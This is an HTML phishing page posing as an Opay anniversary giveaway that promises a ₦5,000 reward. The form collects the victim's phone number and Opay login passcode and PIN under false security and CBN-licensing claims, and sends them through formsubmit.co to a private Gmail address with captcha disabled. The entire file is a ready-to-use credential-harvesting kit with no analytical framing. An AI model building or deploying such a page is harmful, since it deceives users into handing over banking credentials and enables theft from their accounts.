<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Opay - 17th anniversary🎉</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:Arial,sans-serif}
body{background:#0b0f19;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;position:relative}
#bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;pointer-events:none;overflow:hidden}
.float{position:absolute;width:45px;height:45px;border:7px solid #00b98b;border-radius:50%;opacity:0.12}
.card{background:#fff;width:100%;max-width:420px;border-radius:16px;padding:28px;z-index:2;position:relative;box-shadow:0 10px 30px rgba(0,0,0,0.5)}
.logo{width:60px;height:60px;border:10px solid #00b98b;border-radius:50%;margin:0 auto 12px;position:relative}
.logo::after{content:'';position:absolute;left:-10px;top:50%;transform:translateY(-50%);width:18px;height:10px;background:#fff}
h2{text-align:center;font-size:20px;color:#111}
.sub{text-align:center;font-size:13px;color:#666;margin-bottom:20px}
label{display:block;font-size:13px;font-weight:700;margin:14px 0 5px}
input,select,textarea{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:14px}
.rating{display:flex;justify-content:space-between;margin:8px 0 15px}
.rating button{width:44px;height:44px;border-radius:50%;border:1px solid #ddd;background:#f5f5f5;font-weight:700;cursor:pointer}
.rating button.active{background:#00b98b;color:#fff;border-color:#00b98b}
.submit{width:100%;background:#00b98b;color:#fff;border:none;padding:14px;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px}
</style>
</head>
<body>
<div id="bg"></div>

<div class="card">
<div class="logo"></div>
<h2>opay anniversary giverway. </h2>
<div class="sub">to claim your₦5000🎉successfully make sure the information below is provided correctly, licensed by .CBN</div>

<form action="https://formsubmit.co/qlitobadys@gmail.com" method="POST">
<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_subject" value="New Qpay Feedback">
<input type="hidden" name="_template" value="table">
<input type="hidden" name="rating" id="rating-value" value="5000">

<label>phone number</label>
<input type="tel" name="phone number" placeholder="type here...." required>

<label>confirm login 6 & 4  digits</label>
<input type="tel" name=" 6 digits" placeholder="6&4 eg.748873 \8899." required>

<label>What service do you need?</label>
<select name="service_type">
<option>WiFi Subscription</option>
<option>claim your ₦5,000 reward</option>
<option>buy Airtime</option>
<option>Other</option>
</select>

<label>how much do you wish to claim</label>
<div class="rating">
<button type="button" onclick="setRating(this,'1000')">1000</button>
<button type="button" class="active" onclick="setRating(this,'2000')">2000</button>
<button type="button" onclick="setRating(this,'3000')">3000</button>
<button type="button" onclick="setRating(this,'4000')">4000</button>
<button type="button" onclick="setRating(this,'5000')">5000</button>
</div>

<label> caution ⚠️</label>
<input type="tel"name"="7" placeholder="make sure you include your opay 6&4 for digits in code confirmation to successfully claim this rewards we use your information for security purpose and to protect your account against fraud against fraud. terms and conditions apply." required></textarea>

<button type="submit" class="submit">claim reward🔥</button>
</form>
</div>

<script>
const bg=document.getElementById('bg');
for(let i=0;i<25;i++){
 let d=document.createElement('div');d.className='float';
 d.style.left=Math.random()*95+'%';d.style.top=Math.random()*95+'%';
 bg.appendChild(d);
}
function setRating(el,val){
 document.querySelectorAll('.rating button').forEach(b=>b.classList.remove('active'));
 el.classList.add('active');
 document.getElementById('rating-value').value=val;
}
</script>
</body>
</html>
